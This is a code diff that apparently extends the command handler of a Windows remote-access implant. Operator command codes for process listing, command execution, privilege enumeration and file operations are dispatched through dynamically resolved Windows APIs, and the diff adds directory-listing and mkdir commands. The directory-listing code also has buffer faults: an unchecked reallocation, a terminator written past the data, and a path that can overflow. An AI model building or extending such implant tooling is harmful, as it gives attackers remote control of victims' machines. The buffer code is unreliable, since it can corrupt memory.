@@ -2,6 +2,11 @@
 #include <stdio.h>
 
 
+/*
+	todo
+		cleanup do_ls and do_getprivs, also make output prettier
+*/
+
 enum CMD_ACTION_CODES {
 	CMD_CODE_PS,
 	CMD_CODE_CMD,
@@ -14,6 +19,7 @@ enum CMD_ACTION_CODES {
 	CMD_CODE_CP,
 	CMD_CODE_RMDIR,
 	CMD_CODE_GETPRIVS,
+	CMD_CODE_MKDIR,
 };
 
 
@@ -53,6 +59,9 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 		case CMD_CODE_RMDIR:
 			do_rmdir();
 			break;
+		case CMD_CODE_MKDIR:
+			do_mkdir();
+			break;
 
 		case CMD_CODE_RM:
 			do_rm();
@@ -71,7 +80,7 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 }
 
 
-// todo, cleanup this, also make output prettier
+
 void commanders::do_getprivs() {
 	PTOKEN_PRIVILEGES TokenPrivs = NULL;
 	PCHAR buf					 = NULL;
@@ -208,7 +217,80 @@ CLEANUP:
 
 
 void commanders::do_ls() {
-	return;
+	WIN32_FIND_DATAA FindData;
+	HANDLE hFind = NULL;
+	
+	DWORD typeLen;
+	DWORD BufSize   = 12 * 1024;
+	DWORD TotalSize = 0;
+	DWORD Namelen   = 0;
+	DWORD EntryLen  = 0;
+	DWORD PathSize  = 0;
+
+	char path[MAX_PATH];
+	const char* type;
+	g_ByteMgr->BeginTask();
+
+	UINT len = g_ByteMgr->Read4();
+	PCHAR Dir = g_ByteMgr->ReadString(len);
+	PBYTE buf = AllocMemory<BYTE>(BufSize);
+	if (!buf) {
+		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
+		goto CLEANUP;
+	}
+
+	
+	PathSize = GetFullPathNameA(Dir, MAX_PATH, path, NULL);
+	path[PathSize] = '\\';
+	path[++PathSize] = '*';
+	path[++PathSize] = '\0';
+
+	hFind = hades->WinApis.FindFirstFileA(path, &FindData);
+	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
+		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
+		goto CLEANUP;
+	}
+
+	do {
+		if (strcmp(FindData.cFileName, "..") == 0 || strcmp(FindData.cFileName, ".") == 0) {
+			continue;
+		}
+		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+			type = "DIR"; typeLen = 3;
+		}
+		else if (FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
+			type = "LINK", typeLen = 4;
+		}
+		else {
+			type = "FILE"; typeLen = 4;
+		}
+
+		Namelen = (DWORD)strlen(FindData.cFileName);
+		EntryLen = Namelen + 1 + typeLen;
+
+		if (TotalSize + EntryLen + 1 > BufSize) {
+			DWORD NewCap = BufSize * 2;
+			while (NewCap < TotalSize + EntryLen + 1) NewCap *= 2;
+			PBYTE newBuf = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, NewCap);
+			buf = newBuf;
+			BufSize = NewCap;
+		}
+
+		memcpy(buf + TotalSize, FindData.cFileName, Namelen);
+		buf[TotalSize + Namelen] = ' ';
+		memcpy(buf + TotalSize + Namelen + 1, type, typeLen);
+		buf[TotalSize + EntryLen] = '\n';
+		TotalSize += EntryLen + 1;
+
+	} while (hades->WinApis.FindNextFileA(hFind, &FindData));
+
+	if (TotalSize > 0) { buf[TotalSize + EntryLen] = '\0'; }
+	g_ByteMgr->EndOkData(buf, TotalSize);
+
+CLEANUP:
+	if (Dir) { g_ByteMgr->FreeString(Dir); }
+	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
+
 }
 
 void commanders::do_cp() {
@@ -248,6 +330,23 @@ void commanders::do_rmdir() {
 CLEANUP:
 	if (DirName) { g_ByteMgr->FreeString(DirName); }
 	return;
+}
+
+
+void commanders::do_mkdir() {
+	g_ByteMgr->BeginTask();
+	
+	DWORD Len = g_ByteMgr->Read4();
+	PCHAR Name = g_ByteMgr->ReadString(Len);
+
+	if (!hades->WinApis.CreateDirectoryA(Name, NULL)) {
+		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
+		goto CLEANUP;
+	}
+	g_ByteMgr->EndErr(MKDIR_SUCCESS);
+
+CLEANUP:
+	if (Name) { g_ByteMgr->FreeString(Name); }
 }
 
 void commanders::do_rm() {
